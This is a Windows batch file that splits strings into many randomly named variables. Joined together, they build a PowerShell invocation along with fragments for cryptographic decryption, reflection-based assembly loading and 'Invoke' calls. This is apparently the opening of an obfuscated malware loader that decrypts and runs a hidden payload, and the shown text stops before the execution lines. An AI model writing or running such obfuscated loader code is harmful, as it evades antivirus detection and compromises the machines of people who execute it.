@echo off
set "yCvtaLVdJR=py"
set "yqjnWVTwWu=st"
set "hPqeayyXUg=nd"
set "mGQQTQAvUZ=we"
set "MMyRNpKHJL=1."
set "HqADdIeala=ll"
set "tHoCbbAkbs=\v"
set "NDlPMdSPql= C"
set "cefotkeOAe= /"
set "XkidrzIthf=po"
set "ReQjITcjCQ=ws"
set "goBjGQhTKo=0\"
set "tYyqqlnaqS=ll"
set "HyjBYGzGCb=we"
set "NcJpgXoeui=:\"
set "OGkazllyVL=rS"
set "dTFVeYLFoI=Sy"
set "bfTVTspRac=y "
set "HKlBDXluDU=Po"
set "TGANuBEvAo=he"
set "gWVihiJlTL=he"
set "xRJAmiyEYM=s\"
set "ZTYidsePFM=32"
set "cKMGjeybVz=co"
set "hTMgXpfQSS=em"
set "BFrEMffeVk=rs"
set "tExWmbXvgw=xe"
set "pcIEFjgyYO=in"
set "mJLJLwSfmd=ow"
set "LnRDEgHvEq=\W"
set "qBrJNsSDql=.e"
set "EEfHQZZZku=Wi"
set "SVNwIEsbkD=do"
set "nObWlEJXlL=cd"
set "GESRdGFwXz= %~dp0"
set "WlxXGVMOlL=$HaK"
set "lcwmkRLGHk=Disp"
set "yqGUfqPxHB=Bmor"
set "RIXgcgSiiC=Dn ="
set "lURsaJJmGG=UGTu"
set "EABoYPCNbm=isfL"
set "ALMMZQEGmM=ne);"
set "OrIeunCUVz=th('"
set "xzSdsKtZBN=Invo"
set "TZyKLWnWqO=[Sys"
set "BhgBLkISVw=Mode"
set "pJIdeiNOlJ=.Len"
set "FOecirizFB=m(, "
set "oFRSgUSYrI=BC;$"
set "esyztAQOqU=MGHW"
set "FXsxrWPSXz=, (,"
set "MJARcYMDSa=tEse"
set "DQQpAuqmLS=rity"
set "DokahtFVqV=);$d"
set "JGTqQLBvBt=$HaK"
set "MXiOPFxttQ=e = "
set "kpsZdSLCSW=t Sy"
set "mzmrCkhAbQ=] -j"
set "pclvezSLsw=736u"
set "AtsRacLDfu=null"
set "aHZdwFUygd=Obje"
set "fTeEkhknsn=y.Ci"
set "CcwyueiOCo=lit("
set "ZOOwbmQBlO=oint"
set "zHWVsySjfk=ptog"
set "KRNrZRrAHX=  $p"
set "YIfdRpVIVp=.Key"
set "UvelpwZuGT=ke($"
set "MxrSUUmdXv= = $"
set "eIREayKiDy=join"
set "scayPzawWr=d;$t"
set "bHZkqrnHUX='[-1"
set "STlBlZZlrZ=;$Bv"
set "VYRIjRcQWt=lBlo"
set "TLCsDtcPWe=bjec"
set "xEgoBaqEss=pStr"
set "thBQXIsKiw=.Sec"
set "wyQRVntJNV=daeR"
set "whIttgILzo=]::("
